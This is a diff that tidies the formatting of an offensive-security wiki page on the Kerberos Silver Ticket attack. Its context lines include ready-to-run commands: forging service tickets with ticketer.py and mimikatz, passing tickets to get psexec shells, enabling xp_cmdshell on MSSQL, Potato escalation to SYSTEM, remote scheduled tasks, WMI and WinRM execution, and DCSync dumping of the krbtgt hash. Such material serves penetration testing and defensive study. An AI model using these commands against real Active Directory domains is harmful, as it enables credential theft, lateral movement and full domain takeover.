@@ -1,7 +1,5 @@
 # Silver Ticket
 
-
-
 ## Silver ticket
 
 The **Silver Ticket** attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on **acquiring the NTLM hash of a service account**, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, **impersonating any user**, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.
@@ -19,7 +17,7 @@ python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
-```
+
 ### On Windows
 
 ```bash
@@ -38,7 +36,7 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-```
+
 The CIFS service is highlighted as a common target for accessing the victim's file system, but other services like HOST and RPCSS can also be exploited for tasks and WMI queries.
 
 ### Example: MSSQL service (MSSQLSvc) + Potato to SYSTEM
@@ -55,7 +53,7 @@ export KRB5CCNAME=$PWD/administrator.ccache
 impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
   -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
 ```
-```
+
 - If the resulting context has SeImpersonatePrivilege (often true for service accounts), use a Potato variant to get SYSTEM:
 
 ```bash
@@ -64,7 +62,7 @@ PrintSpoofer.exe -c "cmd /c whoami"
 # or
 GodPotato -cmd "cmd /c whoami"
 ```
-```
+
 More details on abusing MSSQL and enabling xp_cmdshell:
 
 [[abusing-ad-mssql.md]]
@@ -139,7 +137,7 @@ dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-```
+
 You will also be able to obtain a shell inside the host or execute arbitrary commands using **psexec**:
 
 [[../lateral-movement/psexec-and-winexec.md]]
@@ -159,7 +157,7 @@ schtasks /query /S some.vuln.pc
 #Run created schtask now
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
-```
+
 ### HOST + RPCSS
 
 With these tickets you can **execute WMI in the victim system**:
@@ -173,7 +171,7 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
-```
+
 Find **more information about wmiexec** in the following page:
 
 [[../lateral-movement/wmiexec.md]]
@@ -185,7 +183,7 @@ With winrm access over a computer you can **access it** and even get a PowerShel
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-```
+
 Check the following page to learn **more ways to connect with a remote host using winrm**:
 
 [[../lateral-movement/winrm.md]]
@@ -200,16 +198,15 @@ With this privilege you can dump the DC database using **DCSync**:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
-```
+
 **Learn more about DCSync** in the following page:
 
 [[dcsync.md]]
 
 ## References
 
-- [[https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets|https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets]]
-- [[https://www.tarlogic.com/blog/how-to-attack-kerberos/|https://www.tarlogic.com/blog/how-to-attack-kerberos/]]
-- [[https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027|https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027]]
-- [[https://0xdf.gitlab.io/2025/08/28/htb-sendai.html|HTB Sendai – 0xdf: Silver Ticket + Potato path]]
-
+- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
+- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
+- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
 
